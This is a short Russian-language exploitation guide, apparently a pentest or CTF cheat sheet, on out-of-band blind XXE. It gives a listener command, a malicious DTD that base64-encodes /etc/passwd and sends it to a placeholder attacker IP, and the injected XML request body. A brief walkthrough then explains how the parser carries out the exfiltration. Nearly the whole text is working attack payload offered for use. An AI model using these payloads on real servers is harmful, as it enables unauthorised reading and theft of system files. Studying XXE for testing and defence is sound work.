# Out-of-Band XXE Exploitation

## Цель
Извлечь содержимое файла /etc/passwd с сервера через слепую XXE уязвимость.

## Шаги эксплуатации

### 1. Подготовка слушателя
python3 -m http.server 1337

### 2. Создание DTD файла на атакующей машине (sample.dtd):
<!ENTITY % cmd SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oobxxe "<!ENTITY exfil SYSTEM 'http://АТАКУЮЩИЙ_IP:1337/?data=%cmd;'>">
%oobxxe;

### 3. Перехватываем запрос в burp и меняем тело на:
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE upload SYSTEM "http://АТАКУЮЩИЙ_IP:1337/sample.dtd">
<upload>
    <file>&exfil;</file>
</upload>

Как это работает:
1. Цель скачивает sample.dtd(инструкцию)

2. DTD выполняется: создаются %cmd, %oobxxe, %exfil

3. Парсер видит &exfil; в XML и говорит: "О, нужно подставить значение этой сущности"

4. Значение &exfil; — это SYSTEM 'http://.../?data=%cmd;'

5. Парсер подставляет %cmd; → читает /etc/passwd → кодирует → делает запрос с данными на сервер атакующего
